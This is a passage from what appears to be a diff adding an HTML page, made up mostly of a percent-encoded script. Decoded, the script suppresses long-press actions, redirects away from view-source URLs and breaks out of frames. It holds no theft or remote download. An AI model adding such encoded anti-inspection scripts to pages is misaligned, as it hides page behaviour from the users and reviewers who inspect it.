%20%20%20%20%20%20%63%6F%6E%73%74%20%74%20%3D%20%65%2E%74%61%72%67%65%74%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%69%66%20%28%21%74%2E%63%6C%6F%73%65%73%74%20%7C%7C%20%28%21%74%2E%63%6C%6F%73%65%73%74%28%27%69%6E%70%75%74%27%29%20%26%26%20%21%74%2E%63%6C%6F%73%65%73%74%28%27%74%65%78%74%61%72%65%61%27%29%29%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%74%6F%75%63%68%54%69%6D%65%72%20%3D%20%73%65%74%54%69%6D%65%6F%75%74%28%66%75%6E%63%74%69%6F%6E%28%29%20%7B%20%65%2E%70%72%65%76%65%6E%74%44%65%66%61%75%6C%74%28%29%3B%20%7D%2C%20%36%30%30%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%2C%20%7B%20%70%61%73%73%69%76%65%3A%20%66%61%6C%73%65%20%7D%29%3B%0A%20%20%20%20%20%20%20%20%64%6F%63%75%6D%65%6E%74%2E%61%64%64%45%76%65%6E%74%4C%69%73%74%65%6E%65%72%28%27%74%6F%75%63%68%65%6E%64%27%2C%20%66%75%6E%63%74%69%6F%6E%28%29%20%7B%20%63%6C%65%61%72%54%69%6D%65%6F%75%74%28%74%6F%75%63%68%54%69%6D%65%72%29%3B%20%7D%2C%20%7B%20%70%61%73%73%69%76%65%3A%20%66%61%6C%73%65%20%7D%29%3B%0A%20%20%20%20%20%20%20%20%64%6F%63%75%6D%65%6E%74%2E%61%64%64%45%76%65%6E%74%4C%69%73%74%65%6E%65%72%28%27%74%6F%75%63%68%6D%6F%76%65%27%2C%20%66%75%6E%63%74%69%6F%6E%28%29%20%7B%20%63%6C%65%61%72%54%69%6D%65%6F%75%74%28%74%6F%75%63%68%54%69%6D%65%72%29%3B%20%7D%2C%20%7B%20%70%61%73%73%69%76%65%3A%20%66%61%6C%73%65%20%7D%29%3B%0A%20%20%20%20%20%20%20%20%69%66%20%28%77%69%6E%64%6F%77%2E%6C%6F%63%61%74%69%6F%6E%2E%70%72%6F%74%6F%63%6F%6C%20%3D%3D%3D%20%27%76%69%65%77%2D%73%6F%75%72%63%65%3A%27%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%77%69%6E%64%6F%77%2E%6C%6F%63%61%74%69%6F%6E%2E%68%72%65%66%20%3D%20%77%69%6E%64%6F%77%2E%6C%6F%63%61%74%69%6F%6E%2E%68%72%65%66%2E%72%65%70%6C%61%63%65%28%27%76%69%65%77%2D%73%6F%75%72%63%65%3A%27%2C%20%27%27%29%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%74%72%79%20%7B%20%69%66%20%28%77%69%6E%64%6F%77%2E%74%6F%70%20%21%3D%3D%20%77%69%6E%64%6F%77%2E%73%65%6C%66%29%20%7B%20%77%69%6E%64%6F%77%2E%74%6F%70%2E%6C%6F%63%61%74%69%6F%6E%20%3D%20%77%69%6E%64%6F%77%2E%73%65%6C%66%2E%6C%6F%63%61%74%69%6F%6E%3B%20%7D%20%7D%20%63%61%74%63%68%20%28%65%29%20%7B%7D%0A%20%20%20%20%7D%29%28%29%3B%0A%20%20%20%20%3C%2F%73%63%72%69%70%74%3E'))</script>
+</body>
+</html>
